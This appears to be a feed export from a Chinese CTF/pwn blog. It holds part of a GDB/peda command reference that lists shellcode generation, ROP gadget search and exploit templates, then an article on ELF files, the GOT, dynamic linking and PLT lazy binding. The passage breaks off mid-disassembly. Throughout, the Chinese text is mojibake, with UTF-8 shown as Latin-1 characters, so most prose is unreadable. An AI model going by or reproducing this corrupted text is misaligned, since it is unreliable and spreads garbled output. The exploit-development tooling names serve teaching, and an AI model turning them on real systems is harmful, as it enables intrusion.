æŒ‰æµ®ç‚¹æ•°æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚x/<n f="" u=""> <addr>nã€fã€uæ˜¯å¯é€‰çš„å‚æ•°ã€‚bè¡¨ç¤ºå•å­—èŠ‚ï¼Œhè¡¨ç¤ºåŒå­—èŠ‚ï¼Œwè¡¨ç¤ºå››å­— èŠ‚ï¼Œgè¡¨ç¤ºå…«å­—èŠ‚ä½†æ˜¯å®é™…çš„ç»„åˆå°±é‚£ä¹ˆå‡ ç§ï¼šx/s åœ°å€ã€€ã€€æŸ¥çœ‹å­—ç¬¦ä¸²x/wx åœ°å€ã€€ã€€æŸ¥çœ‹DWORDx/c åœ°å€ã€€ã€€å•å­—èŠ‚æŸ¥çœ‹x/16x $esp+12 æŸ¥çœ‹å¯„å­˜å™¨åç§»set args å¯æŒ‡å®šè¿è¡Œæ—¶å‚æ•°ã€‚ï¼ˆå¦‚ï¼šset args 10 20 30 40 50ï¼‰show args å‘½ä»¤å¯ä»¥æŸ¥çœ‹è®¾ç½®å¥½çš„è¿è¡Œå‚æ•°ã€‚pedaçš„æ•™ç¨‹å¢å¼ºgdbçš„æ˜¾ç¤ºï¼šåœ¨è°ƒè¯•è¿‡ç¨‹ä¸­ç€è‰²å¹¶æ˜¾ç¤ºåæ±‡ç¼–ä»£ç ï¼Œå¯„å­˜å™¨å’Œå†…å­˜ä¿¡æ¯ã€‚æ·»åŠ å‘½ä»¤ä»¥æ”¯æŒè°ƒè¯•å’Œåˆ©ç”¨å¼€å‘ï¼ˆæœ‰å…³å‘½ä»¤ä½¿ç”¨çš„å®Œæ•´åˆ—è¡¨peda helpï¼‰ï¼šaslr - æ˜¾ç¤º/è®¾ç½®GDBçš„ASLRè®¾ç½®checksec - æ£€æŸ¥äºŒè¿›åˆ¶æ–‡ä»¶çš„å„ç§å®‰å…¨é€‰é¡¹dumpargs - åœ¨å‘¼å«æŒ‡ä»¤å¤„åœæ­¢æ—¶æ˜¾ç¤ºä¼ é€’ç»™å‡½æ•°çš„å‚æ•°dumprop - å°†ç‰¹å®šå†…å­˜èŒƒå›´å†…çš„æ‰€æœ‰ROPå°å·¥å…·è½¬å‚¨elfheader - ä»è¢«è°ƒè¯•çš„ELFæ–‡ä»¶ä¸­è·å–æ ‡é¢˜ä¿¡æ¯elfsymbol - ä»ELFæ–‡ä»¶è·å–éè°ƒè¯•ç¬¦å·ä¿¡æ¯lookup - æœç´¢æ‰€æœ‰åœ°å€/å‚è€ƒåœ°å€å±äºä¸€ä¸ªå†…å­˜èŒƒå›´patch - ä¿®è¡¥ç¨‹åºå†…å­˜ä»¥string / hexstring / intçš„åœ°å€å¼€å§‹pattern - ç”Ÿæˆï¼Œæœç´¢æˆ–å†™å…¥å¾ªç¯æ¨¡å¼åˆ°å†…å­˜procinfo - æ˜¾ç¤º/ proc / pid /pshow - æ˜¾ç¤ºå„ç§PEDAé€‰é¡¹å’Œå…¶ä»–è®¾ç½®pset - è®¾ç½®å„ç§PEDAé€‰é¡¹å’Œå…¶ä»–è®¾ç½®readelf - ä»ELFæ–‡ä»¶è·å–æ ‡é¢˜ä¿¡æ¯ropgadget - è·å–äºŒè¿›åˆ¶æˆ–åº“çš„é€šç”¨ROPå°å·¥å…·ropsearch - åœ¨å†…å­˜ä¸­æœç´¢ROPå°å·¥å…·searchmem|find - åœ¨å†…å­˜ä¸­æœç´¢æ¨¡å¼; æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼æœç´¢//æŸ¥æ‰¾ç”¨ï¼Œä¾‹å¦‚searchmemâ€œ/ bin / shâ€libcshellcode - ç”Ÿæˆæˆ–ä¸‹è½½å¸¸ç”¨çš„shellcodeã€‚skeleton - ç”Ÿæˆpythonæ¼æ´åˆ©ç”¨ä»£ç æ¨¡æ¿vmmap -- Get virtual mapping address ranges of section(s) in debugged process  //å¯ä»¥ç”¨æ¥æŸ¥çœ‹æ ˆã€bssæ®µæ˜¯å¦å¯ä»¥æ‰§è¡Œxormem - ç”¨ä¸€ä¸ªé”®å¼‚æˆ–å­˜å‚¨åŒºåŸŸ</addr></n></code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">info file  // æŸ¥çœ‹å½“å‰æ–‡ä»¶çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ç¨‹åºå…¥å£ç‚¹info break // æŸ¥çœ‹å½“å‰æ–­ç‚¹ä¿¡æ¯disassemble + func // å¯¹æŒ‡å®šçš„å‡½æ•°è¿›è¡Œåæ±‡ç¼–break +''åœ°å€''  // è®¾ç½®æ–­ç‚¹r(run)  // è¿è¡Œç¨‹åºc(contunue)  // ç»§ç»­æ‰§è¡Œx / (n , f ,u) // n,f,uæ˜¯å…¶ä¸‰ä¸ªå¯é€‰å‚æ•°  næ˜¯ä¸€ä¸ªæ­£æ•´æ•°ï¼Œè¡¨ç¤ºéœ€è¦æ˜¾ç¤ºçš„å†…å­˜å•å…ƒçš„ä¸ªæ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ä»å½“å‰åœ°å€å‘åæ˜¾ç¤ºå‡ ä¸ªå†…å­˜å•å…ƒçš„å†…å®¹ï¼Œä¸€ä¸ªå†…å­˜å•å…ƒçš„å¤§å°ç”±åé¢çš„uå®šä¹‰ã€‚  f è¡¨ç¤ºæ˜¾ç¤ºçš„æ ¼å¼ï¼Œå‚è§ä¸‹é¢ã€‚å¦‚æœåœ°å€æ‰€æŒ‡çš„æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæ ¼å¼å¯ä»¥æ˜¯sï¼Œå¦‚æœåœ°å€æ˜¯æŒ‡ä»¤åœ°å€ï¼Œé‚£ä¹ˆæ ¼å¼å¯ä»¥æ˜¯iã€‚  u è¡¨ç¤ºä»å½“å‰åœ°å€å¾€åè¯·æ±‚çš„å­—èŠ‚æ•°ï¼Œå¦‚æœä¸æŒ‡å®šçš„è¯ï¼ŒGDBé»˜è®¤æ˜¯4ä¸ªbytesã€‚uå‚æ•°å¯ä»¥ç”¨ä¸‹é¢çš„å­—ç¬¦æ¥ä»£æ›¿ï¼Œbè¡¨ç¤ºå•å­—èŠ‚ï¼Œhè¡¨ç¤ºåŒå­—èŠ‚ï¼Œwè¡¨ç¤ºå››å­—èŠ‚ï¼Œgè¡¨ç¤ºå…«å­—èŠ‚ã€‚å½“æˆ‘ä»¬æŒ‡å®šäº†å­—èŠ‚é•¿åº¦åï¼ŒGDBä¼šä»æŒ‡å†…å­˜å®šçš„å†…å­˜åœ°å€å¼€å§‹ï¼Œè¯»å†™æŒ‡å®šå­—èŠ‚ï¼Œå¹¶æŠŠå…¶å½“ä½œä¸€ä¸ªå€¼å–å‡ºæ¥ã€‚layout // ç”¨äºåˆ†å‰²çª—å£ï¼Œå¯ä»¥ä¸€è¾¹æŸ¥çœ‹ä»£ç ï¼Œä¸€è¾¹æµ‹è¯•ã€‚ä¸»è¦æœ‰ä¸‹é¢å‡ ç§ç”¨æ³•ï¼šlayout src // æ˜¾ç¤ºæºä»£ç çª—å£layout asm // æ˜¾ç¤ºæ±‡ç¼–çª—å£layout regs // æ˜¾ç¤ºæºä»£ç /æ±‡ç¼–å’Œå¯„å­˜å™¨çª—å£layout split // æ˜¾ç¤ºæºä»£ç å’Œæ±‡ç¼–çª—å£layout next // æ˜¾ç¤ºä¸‹ä¸€ä¸ªlayoutlayout prev // æ˜¾ç¤ºä¸Šä¸€ä¸ªlayoutCtrl + L // åˆ·æ–°çª—å£Ctrl + x  å†æŒ‰1 // å•çª—å£æ¨¡å¼ï¼Œæ˜¾ç¤ºä¸€ä¸ªçª—å£Ctrl + x  å†æŒ‰2 // åŒçª—å£æ¨¡å¼ï¼Œæ˜¾ç¤ºä¸¤ä¸ªçª—å£Ctrl + x  å†æŒ‰a // å›åˆ°ä¼ ç»Ÿæ¨¡å¼ï¼Œå³é€€å‡ºlayoutï¼Œå›åˆ°æ‰§è¡Œlayoutä¹‹å‰çš„è°ƒè¯•çª—å£ã€‚</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PwnåŸºç¡€----ELFæ–‡ä»¶åŸºç¡€</title>
      <link href="/2020/02/18/ctf/pwn/linux-elf/"/>
      <url>/2020/02/18/ctf/pwn/linux-elf/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-ELFæ–‡ä»¶åŸºæœ¬å¸¸è¯†äº†è§£"><a href="#Linux-ELFæ–‡ä»¶åŸºæœ¬å¸¸è¯†äº†è§£" class="headerlink" title="Linux-ELFæ–‡ä»¶åŸºæœ¬å¸¸è¯†äº†è§£"></a>Linux-ELFæ–‡ä»¶åŸºæœ¬å¸¸è¯†äº†è§£</h1><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æœ¬ç¯‡å‚è€ƒ <a href="https://www.freebuf.com/news/182894.html" target="_blank" rel="noopener">StackOverFlowä¹‹Ret2libcè¯¦è§£</a> å¹¶ä½¿ç”¨äº†å…¶éƒ¨åˆ†å†…å®¹ï¼Œåœ¨æ­¤è¡¨ç¤ºæ„Ÿè°¢</p><h2 id="0x10-ç›®æ ‡æ–‡ä»¶æ ¼å¼"><a href="#0x10-ç›®æ ‡æ–‡ä»¶æ ¼å¼" class="headerlink" title="0x10 ç›®æ ‡æ–‡ä»¶æ ¼å¼"></a>0x10 ç›®æ ‡æ–‡ä»¶æ ¼å¼</h2><pre class=" language-lang-txt"><code class="language-lang-txt">ELFï¼ˆExecutable Linkable Format ---- å³å¯æ‰§è¡Œé“¾æ¥æ ¼å¼ï¼‰ï¼ŒWindowsä¸‹ä¸ºPEï¼ˆPortable Executable ----å¯ç§»æ¤å¯æ‰§è¡Œæ–‡ä»¶ï¼‰ã€‚å®ƒä»¬éƒ½æ˜¯COFFï¼ˆCommon Format ---- é€šç”¨æ–‡ä»¶æ ¼å¼ï¼‰æ ¼å¼çš„å˜ç§Linuxä¸‹æˆ‘ä»¬å°†ç›®æ ‡æ–‡ä»¶ä¸å¯æ‰§è¡Œæ–‡ä»¶ç»Ÿç§°ä¸ºELFæ–‡ä»¶ï¼Œ åŠ¨æ€é“¾æ¥åº“ï¼ˆDLL, Dynamic Linking Library ä¾‹å¦‚ï¼šlinuxä¸‹çš„.soæ–‡ä»¶ï¼‰ä¸é™æ€é“¾æ¥åº“ï¼ˆStatic Linking Library ä¾‹å¦‚ï¼šlinuxä¸‹çš„.aæ–‡ä»¶ï¼‰æ–‡ä»¶éƒ½æŒ‰ç…§</code></pre><div class="table-container"><table><thead><tr><th style="text-align:left">ELFæ–‡ä»¶ç±»å‹</th><th style="text-align:left">è¯´æ˜</th><th style="text-align:center">å®ä¾‹</th></tr></thead><tbody><tr><td style="text-align:left">å¯é‡å®šä½æ–‡ä»¶ï¼ˆRelocatable Fileï¼‰</td><td style="text-align:left">è¿™ç±»æ–‡ä»¶åŒ…å«äº†ä»£ç å’Œæ•°æ®ï¼Œå¯ä»¥ç”¨æ¥é“¾æ¥æˆå¯æ‰§è¡Œæ–‡ä»¶æˆ–å…±äº«ç›®æ ‡æ–‡ä»¶ï¼Œé™æ€é“¾æ¥åº“ä¹Ÿå¯ä»¥å½’ä¸ºè¿™ä¸€ç±»</td><td style="text-align:center">linux çš„.oæ–‡ä»¶</td></tr><tr><td style="text-align:left">å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆExecutable Fileï¼‰</td><td style="text-align:left">è¿™ç±»æ–‡ä»¶åŒ…å«äº†å¯ä»¥ç›´æ¥æ‰§è¡Œçš„ç¨‹åºï¼Œå®ƒçš„ä»£è¡¨å°±æ˜¯ELFå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä»–ä»¬ä¸€èˆ¬éƒ½æ²¡æœ‰æ‰©å±•å</td><td style="text-align:center">æ¯”å¦‚/bin/bash æ–‡ä»¶</td></tr><tr><td style="text-align:left">å…±äº«ç›®æ ‡æ–‡ä»¶ï¼ˆShare Object Fileï¼‰</td><td style="text-align:left">è¿™ç§æ–‡ä»¶åŒ…å«äº†ä»£ç å’Œæ•°æ®ï¼Œå¯ä»¥åœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¸‹ä½¿ç”¨ã€‚ä¸€ç§æ˜¯é“¾æ¥å™¨å¯ä»¥ä½¿ç”¨è¿™ç§æ–‡ä»¶è·Ÿå…¶å®ƒçš„å¯ä»å®šä½æ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶é“¾æ¥ï¼Œäº§ç”Ÿæ˜¾å¾—ç›®æ ‡æ–‡ä»¶ã€‚ç¬¬äºŒç§æ˜¯åŠ¨æ€é“¾æ¥å™¨å¯ä»¥å°†å‡ ä¸ªè¿™ç§å…±äº«ç›®æ ‡æ–‡ä»¶ä¸å¯æ‰§è¡Œæ–‡ä»¶ç»“åˆï¼Œä½œä¸ºè¿›ç¨‹æ˜ åƒçš„ä¸€éƒ¨åˆ†æ¥è¿è¡Œ</td><td style="text-align:center">linux çš„.soï¼Œå¦‚ï¼š/lib/glibc-2.5.so</td></tr><tr><td style="text-align:left">æ ¸å¿ƒè½¬å‚¨æ–‡ä»¶ï¼ˆCore Dump Fileï¼‰</td><td style="text-align:left">å½“è¿›ç¨‹æ„å¤–ç»ˆæ­¢æ—¶ï¼Œç³»ç»Ÿå¯ä»¥å°†è¯¥è¿›ç¨‹çš„åœ°å€ç©ºé—´çš„å†…å®¹åŠç»ˆæ­¢æ—¶çš„ä¸€äº›å…¶å®ƒä¿¡æ¯è½¬å‚¨åˆ°æ ¸å¿ƒè½¬å‚¨æ–‡ä»¶</td><td style="text-align:center">linux ä¸‹çš„ core dump</td></tr></tbody></table></div><p>linux ä¸‹fileå‘½ä»¤å¯ä»¥æŸ¥çœ‹æ–‡ä»¶çš„å±æ€§ï¼š</p><pre class=" language-lang-txt"><code class="language-lang-txt">$ file ret2libc3ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, not stripped</code></pre><p>ELF 32-bit LSB executable //32ä½å¯æ‰§è¡Œæ–‡ä»¶</p><p>Intel 80386 //Intelç‰ˆæœ¬å·</p><p>dynamically linked //åŠ¨æ€é“¾æ¥æ–‡ä»¶</p><h2 id="0x20-GOTï¼ˆGlobal-offset-Tableï¼‰"><a href="#0x20-GOTï¼ˆGlobal-offset-Tableï¼‰" class="headerlink" title="0x20 GOTï¼ˆGlobal offset Tableï¼‰"></a>0x20 GOTï¼ˆGlobal offset Tableï¼‰</h2><p>å…¨å±€åç§»è¡¨. è¿™æ˜¯é“¾æ¥å™¨åœ¨æ‰§è¡Œé“¾æ¥æ—¶<br>å®é™…ä¸Šè¦å¡«å……çš„éƒ¨åˆ†, ä¿å­˜äº†æ‰€æœ‰å¤–éƒ¨ç¬¦å·çš„åœ°å€ä¿¡æ¯.<br>ä¸è¿‡å€¼å¾—æ³¨æ„çš„æ˜¯, åœ¨i386æ¶æ„ä¸‹, é™¤äº†æ¯ä¸ªå‡½æ•°å ç”¨ä¸€ä¸ªGOTè¡¨é¡¹å¤–ï¼ŒGOTè¡¨é¡¹è¿˜ä¿ç•™äº†<br>3ä¸ªå…¬å…±è¡¨é¡¹, æ¯é¡¹32ä½(4å­—èŠ‚), ä¿å­˜åœ¨å‰ä¸‰ä¸ªä½ç½®, åˆ†åˆ«æ˜¯:</p><ul><li>got[0]: æœ¬ELFåŠ¨æ€æ®µ(.dynamicæ®µ)çš„è£…è½½åœ°å€</li><li>got[1]: æœ¬ELFçš„<code>link_map</code>æ•°æ®ç»“æ„æè¿°ç¬¦åœ°å€</li><li>got[2]: <code>_dl_runtime_resolve</code>å‡½æ•°çš„åœ°å€</li></ul><p>å…¶ä¸­, <code>link_map</code>æ•°æ®ç»“æ„çš„å®šä¹‰å¦‚ä¸‹:</p><pre class=" language-lang-C"><code class="language-lang-C">struct link_map{   /* Shared library's load address. */   ElfW(Addr) l_addr;                    /* Pointer to library's name in the string table. */                                    char *l_name;       /*         Dynamic section of the shared object.        Includes dynamic linking info etc.        Not interesting to us.     */                      ElfW(Dyn) *l_ld;      /* Pointer to previous and next link_map node. */                    struct link_map *l_next, *l_prev;   };</code></pre><h2 id="0x30-DLL-Dynamic-linking"><a href="#0x30-DLL-Dynamic-linking" class="headerlink" title="0x30 DLL (Dynamic linking)"></a>0x30 DLL (Dynamic linking)</h2><p><strong>åŠ¨æ€é“¾æ¥</strong> æ˜¯æŒ‡åœ¨ç¨‹åºè£…è½½æ—¶é€šè¿‡ <strong>åŠ¨æ€é“¾æ¥å™¨</strong> å°†ç¨‹åºæ‰€éœ€çš„æ‰€æœ‰ <strong>åŠ¨æ€é“¾æ¥åº“(Dynamic linking library)</strong> è£…è½½è‡³è¿›ç¨‹ç©ºé—´ä¸­ï¼ˆ ç¨‹åºæŒ‰ç…§æ¨¡å—æ‹†åˆ†æˆå„ä¸ªç›¸å¯¹ç‹¬ç«‹çš„éƒ¨åˆ†ï¼‰ï¼Œå½“ç¨‹åºè¿è¡Œæ—¶æ‰å°†ä»–ä»¬é“¾æ¥åœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå®Œæ•´ç¨‹åºçš„è¿‡ç¨‹ã€‚å®ƒè¯ç”Ÿçš„æœ€ä¸»è¦çš„çš„åŸå› å°±æ˜¯ <strong>é™æ€é“¾æ¥</strong> å¤ªè¿‡äºæµªè´¹å†…å­˜å’Œç£ç›˜çš„ç©ºé—´ï¼Œå¹¶ä¸”ç°åœ¨çš„è½¯ä»¶å¼€å‘éƒ½æ˜¯æ¨¡å—åŒ–å¼€å‘ï¼Œä¸åŒçš„æ¨¡å—éƒ½æ˜¯ç”±ä¸åŒçš„å‚å®¶å¼€å‘ï¼Œåœ¨ <strong>é™æ€é“¾æ¥</strong> çš„æƒ…å†µä¸‹ï¼Œä¸€æ—¦å…¶ä¸­æŸä¸€æ¨¡å—å‘ç”Ÿæ”¹å˜å°±ä¼šå¯¼è‡´æ•´ä¸ªè½¯ä»¶éƒ½éœ€è¦é‡æ–°ç¼–è¯‘ï¼Œè€Œé€šè¿‡ <strong>åŠ¨æ€é“¾æ¥</strong> çš„æ–¹å¼å°±æ¨è¿Ÿè¿™ä¸ªé“¾æ¥è¿‡ç¨‹åˆ°äº†ç¨‹åºè¿è¡Œæ—¶è¿›è¡Œã€‚è¿™æ ·åšæœ‰ä»¥ä¸‹å‡ ç‚¹å¥½å¤„ï¼š</p><p>1ã€èŠ‚çœå†…å­˜ã€ç£ç›˜ç©ºé—´</p><p>ä¾‹å¦‚ç£ç›˜ä¸­æœ‰ä¸¤ä¸ªç¨‹åºï¼Œp1ã€p2ï¼Œä¸”ä»–ä»¬ä¸¤ä¸ªéƒ½åŒ…å« lib.o è¿™ä¸ªæ¨¡å—ï¼Œåœ¨ <strong>é™æ€é“¾æ¥</strong> çš„æƒ…å†µä¸‹ä»–ä»¬åœ¨é“¾æ¥è¾“å‡ºå¯æ‰§è¡Œæ–‡ä»¶æ—¶éƒ½ä¼šåŒ…å« lib.o è¿™ä¸ªæ¨¡å—ï¼Œè¿™å°±é€ æˆäº†ç£ç›˜ç©ºé—´çš„æµªè´¹ã€‚å½“è¿™ä¸¤ä¸ªç¨‹åºè¿è¡Œæ—¶ï¼Œå†…å­˜ä¸­åŒæ ·ä¹Ÿå°±åŒ…å«äº†è¿™ä¸¤ä¸ªç›¸åŒçš„æ¨¡å—ï¼Œè¿™ä¹Ÿå°±ä½¿å¾—å†…å­˜ç©ºé—´è¢«æµªè´¹ã€‚å½“ç³»ç»Ÿä¸­åŒ…å«å¤§é‡ç±»ä¼¼ lib.o è¿™ç§è¢«å¤šä¸ªç¨‹åºå…±äº«çš„æ¨¡å—æ—¶ï¼Œä¹Ÿå°±ä¼šé€ æˆå¾ˆå¤§ç©ºé—´çš„æµªè´¹ã€‚åœ¨ <strong>åŠ¨æ€é“¾æ¥</strong> çš„æƒ…å†µä¸‹ï¼Œè¿è¡Œ p1 ï¼Œå½“ç³»ç»Ÿå‘ç°éœ€è¦ç”¨åˆ° lib.o ï¼Œå°±ä¼šæ¥ç€åŠ è½½ lib.o ã€‚è¿™æ—¶æˆ‘ä»¬è¿è¡Œ p2 ï¼Œå°±ä¸éœ€è¦é‡æ–°åŠ è½½ lib.o äº†ï¼Œå› ä¸ºæ­¤æ—¶ lib.o å·²ç»åœ¨å†…å­˜ä¸­äº†ï¼Œç³»ç»Ÿä»…éœ€å°†ä¸¤è€…é“¾æ¥èµ·æ¥ï¼Œæ­¤æ—¶å†…å­˜ä¸­å°±åªæœ‰ä¸€ä¸ª lib.o èŠ‚çœäº†å†…å­˜ç©ºé—´ã€‚</p><p>2ã€ç¨‹åºæ›´æ–°æ›´ç®€å•</p><p>æ¯”å¦‚ç¨‹åº p1 æ‰€ä½¿ç”¨çš„ lib.o æ˜¯ç”±ç¬¬ä¸‰æ–¹æä¾›çš„ï¼Œç­‰åˆ°ç¬¬ä¸‰æ–¹æ›´æ–°ã€æˆ–è€…ä¸º lib.o æ‰“è¡¥ä¸çš„æ—¶å€™ï¼Œp1 å°±éœ€è¦æ‹¿åˆ°ç¬¬ä¸‰æ–¹æœ€æ–°æ›´æ–°çš„ lib.o ï¼Œé‡æ–°é“¾æ¥ååœ¨å°†å…¶å‘å¸ƒç»™ç”¨æˆ·ã€‚ç¨‹åºä¾èµ–çš„æ¨¡å—è¶Šå¤šï¼Œå°±è¶Šå‘æ˜¾å¾—ä¸æ–¹ä¾¿ï¼Œæ¯•ç«Ÿéƒ½æ˜¯ä»ç½‘ç»œä¸Šè·å–æ–°èµ„æºã€‚åœ¨ <strong>åŠ¨æ€é“¾æ¥</strong> çš„æƒ…å†µä¸‹ï¼Œç¬¬ä¸‰æ–¹æ›´æ–° lib.o åï¼Œç†è®ºä¸Šåªéœ€è¦è¦†ç›–æ‰åŸæœ‰çš„ lib.o ï¼Œå°±ä¸å¿…é‡æ–°é“¾æ¥æ•´ä¸ªç¨‹åºï¼Œåœ¨ç¨‹åºä¸‹ä¸€æ¬¡è¿è¡Œæ—¶ï¼Œæ–°ç‰ˆæœ¬çš„ç›®æ ‡æ–‡ä»¶å°±ä¼šè‡ªåŠ¨è£…è½½åˆ°å†…å­˜å¹¶ä¸”é“¾æ¥èµ·æ¥ï¼Œå°±å®Œæˆäº†å‡çº§çš„ç›®æ ‡ã€‚</p><p>3ã€å¢å¼ºç¨‹åºæ‰©å±•æ€§å’Œå…¼å®¹æ€§</p><p><strong>åŠ¨æ€é“¾æ¥</strong> çš„ç¨‹åºåœ¨è¿è¡Œæ—¶å¯ä»¥åŠ¨æ€åœ°é€‰æ‹©åŠ è½½å„ç§æ¨¡å—ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸å¸¸ä½¿ç”¨çš„æ’ä»¶ã€‚è½¯ä»¶çš„å¼€å‘å•†å¼€å‘æŸä¸ªäº§å“æ—¶ä¼šæŒ‰ç…§ä¸€å®šçš„è§„åˆ™åˆ¶å®šå¥½ç¨‹åºçš„æ¥å£ï¼Œå…¶ä»–å¼€å‘è€…å°±å¯ä»¥é€šè¿‡è¿™ç§æ¥å£æ¥ç¼–å†™ç¬¦åˆè¦æ±‚çš„åŠ¨æ€é“¾æ¥æ–‡ä»¶ï¼Œä»¥æ­¤æ¥å®ç°ç¨‹åºåŠŸèƒ½çš„æ‰©å±•ã€‚å¢å¼ºå…¼å®¹æ€§æ˜¯è¡¨ç°åœ¨ <strong>åŠ¨æ€é“¾æ¥</strong> çš„ç¨‹åºå¯¹ä¸åŒå¹³å°çš„ä¾èµ–å·®å¼‚æ€§é™ä½ï¼Œæ¯”å¦‚å¯¹æŸä¸ªå‡½æ•°çš„å®ç°æœºåˆ¶ä¸åŒï¼Œå¦‚æœæ˜¯ <strong>é™æ€é“¾æ¥</strong> çš„ç¨‹åºä¼šä¸ºä¸åŒå¹³å°å‘å¸ƒä¸åŒçš„ç‰ˆæœ¬ï¼Œè€Œåœ¨ <strong>åŠ¨æ€é“¾æ¥</strong> çš„æƒ…å†µä¸‹ï¼Œåªè¦ä¸åŒçš„å¹³å°éƒ½èƒ½æä¾›ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“åŒ…å«è¯¥å‡½æ•°ä¸”æ¥å£ç›¸åŒï¼Œå°±åªéœ€ç”¨ä¸€ä¸ªç‰ˆæœ¬äº†ã€‚</p><p>æ€»è€Œè¨€ä¹‹ï¼Œ<strong>åŠ¨æ€é“¾æ¥</strong> çš„ç¨‹åºåœ¨è¿è¡Œæ—¶ä¼šæ ¹æ®è‡ªå·±æ‰€ä¾èµ–çš„ <strong>åŠ¨æ€é“¾æ¥åº“</strong> ï¼Œé€šè¿‡ <strong>åŠ¨æ€é“¾æ¥å™¨</strong> å°†ä»–ä»¬åŠ è½½è‡³å†…å­˜ä¸­ï¼Œå¹¶åœ¨æ­¤æ—¶å°†ä»–ä»¬é“¾æ¥æˆä¸€ä¸ªå®Œæ•´çš„ç¨‹åºã€‚Linux ç³»ç»Ÿä¸­ï¼Œ<strong>ELF</strong> åŠ¨æ€é“¾æ¥æ–‡ä»¶è¢«ç§°ä¸º <strong>åŠ¨æ€å…±äº«å¯¹è±¡ï¼ˆDynamic Shared Objectsï¼‰</strong> ï¼Œ ç®€ç§° <strong>å…±äº«å¯¹è±¡</strong> ä¸€èˆ¬éƒ½æ˜¯ä»¥ â€œ.soâ€ ä¸ºæ‰©å±•åçš„æ–‡ä»¶ï¼›åœ¨ windows ç³»ç»Ÿä¸­å°±æ˜¯å¸¸å¸¸è½¯ä»¶æŠ¥é”™ç¼ºå°‘ xxx.dll æ–‡ä»¶ã€‚</p><h2 id="0x40-å»¶è¿Ÿç»‘å®š-Lazy-Binding-amp-amp-PLT-Procedure-Linkage-Table"><a href="#0x40-å»¶è¿Ÿç»‘å®š-Lazy-Binding-amp-amp-PLT-Procedure-Linkage-Table" class="headerlink" title="0x40 å»¶è¿Ÿç»‘å®š(Lazy Binding) &amp;&amp; PLT(Procedure Linkage Table)"></a>0x40 å»¶è¿Ÿç»‘å®š(Lazy Binding) &amp;&amp; PLT(Procedure Linkage Table)</h2><p>å› ä¸º <strong>åŠ¨æ€é“¾æ¥</strong> çš„ç¨‹åºæ˜¯åœ¨è¿è¡Œæ—¶éœ€è¦å¯¹å…¨å±€å’Œé™æ€æ•°æ®è®¿é—®è¿›è¡ŒGOTå®šä½ï¼Œç„¶åé—´æ¥å¯»å€ã€‚åŒæ ·ï¼Œå¯¹äºæ¨¡å—é—´çš„è°ƒç”¨ä¹Ÿéœ€è¦GOTå®šä½ï¼Œå†æ‰é—´æ¥è·³è½¬ï¼Œè¿™ä¹ˆåšåŠ¿å¿…ä¼šå½±å“åˆ°ç¨‹åºçš„è¿è¡Œé€Ÿåº¦ã€‚è€Œä¸”ç¨‹åºåœ¨è¿è¡Œæ—¶å¾ˆå¤§ä¸€éƒ¨åˆ†å‡½æ•°éƒ½å¯èƒ½ç”¨ä¸åˆ°ï¼Œäºæ˜¯ELFé‡‡ç”¨äº†å½“å‡½æ•°ç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶æ‰è¿›è¡Œç»‘å®šçš„æ€æƒ³ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„ <strong>å»¶è¿Ÿç»‘å®š</strong>ã€‚ELFå®ç° <strong>å»¶è¿Ÿç»‘å®š</strong> æ˜¯é€šè¿‡ <strong>PLT</strong> ï¼ŒåŸå…ˆ <strong>GOT</strong> ä¸­å­˜æ”¾ç€å…¨å±€å˜é‡å’Œå‡½æ•°è°ƒç”¨ï¼Œç°åœ¨æŠŠä»–æ‹†æˆå¦ä¸ªéƒ¨åˆ† .got å’Œ .got.pltï¼Œç”¨ .got å­˜æ”¾ç€å…¨å±€å˜é‡å¼•ç”¨ï¼Œç”¨ .got.plt å­˜æ”¾ç€å‡½æ•°å¼•ç”¨ã€‚æŸ¥çœ‹ test@plt ä»£ç ï¼Œç”¨ objdump -Mintel -d -j .plt got</p><blockquote><p>-Mintel é€‰é¡¹æŒ‡å®š intel æ±‡ç¼–è¯­æ³•<br>-d é€‰é¡¹å±•ç¤ºå¯æ‰§è¡Œæ–‡ä»¶èŠ‚çš„æ±‡ç¼–å½¢å¼<br>-j é€‰é¡¹åé¢è·Ÿä¸ŠèŠ‚åï¼ŒæŒ‡å®šèŠ‚</p></blockquote><pre class=" language-lang-txt"><code class="language-lang-txt">00001060 <test@plt>:    1060:    ff a3 14 00 00 00        jmp    DWORD PTR [ebx+0x14]    1066:    68 10 00 00 00           push   0x10    106b:    e9 c0 ff ff ff           jmp    1030 &lt;.plt&gt;</test@plt></code></pre><p>æŸ¥çœ‹ main()å‡½æ•° ä¸­è°ƒç”¨ test@plt çš„åæ±‡ç¼–ä»£ç </p><pre class=" language-lang-txt"><code class="language-lang-txt">    11ee:    e8 cd fe ff ff           call   10c0 &lt;__x86.get_pc_thunk.bx&gt;    11f3:    81 c3 0d 2e 00 00        add    ebx,0x2e0d    11f9:    e8 bb ff ff ff           call   11b9 <fun>    11fe:    e8 